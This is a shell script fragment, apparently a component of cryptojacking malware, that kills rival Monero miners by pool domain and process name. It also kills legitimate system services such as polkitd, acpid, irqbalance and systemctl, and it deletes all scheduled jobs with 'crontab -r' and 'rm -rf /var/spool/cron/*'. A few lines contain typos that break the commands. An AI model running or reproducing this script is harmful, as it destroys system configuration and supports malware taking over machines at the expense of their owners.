#kill_miner_proc()
#{
echo "start killing miner processes\n"
ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "pool.tOOIs.ru"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"jawk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9 
ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9 
ps auxf|grep xiaoxuej awk '{print $2}'|xargs kill -9
ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
ps ax|grep -o './[0-9]* -c'| xargs pkill -f
pkill -f biosetjenkins
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbncl
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f minexmr
pkill -f XJnRj
pkill -f mgwsl
pkill -f pythno
pkill -f jweri
pkill -f Ix26
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns 
pkill -f kxjd 
pkill -f Duck.sh 
pkill -f bonn.sh 
pkill -f conn.sh 
pkill -f kworker34 
pkill -f kw.sh 
pkill -f pro.sh 
pkill -f polkitd 
pkill -f acpid 
pkill -f icb5o 
pkill -f nopxi 
pkill -f irqbalancl 
pkill -f minerd 
pkill -f 1586 
pkill -f gddr 
pkill -f mstxmr 
pkill -f ddg.2011 
pkill -f wnTKYg 
pkill -f deamon 
pkill -f disk genius 
pkill -f sourplum 
pkill -f polkitd 
pkill -f nanoWatch 
pkill -f zigw 
pkill -f devtool 
pkill -f systemctl 
pkill -f WmiPrwSe
pkill -f sysguard
pkill -f sysupdate
pkill -f networkservice
crontab -r
rm -rf /var/spool/cron/*

ps auxf | grep -v grep | grep hwlh3wlh44lh | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep /usr/bin/.sshd | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep /usr/bin/bsd-port | awk '{print $2}' | xargs kill -9
ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xig" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "wnTKYg" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "sustes" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "thisxxs" | awk '{print $2}' | xargs kill -9
ps auxf|grep -v grep|grep "hashfish" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "kworkerds" | awk '{print $2}'|xargs kill -9
echo "finish killing"
#}/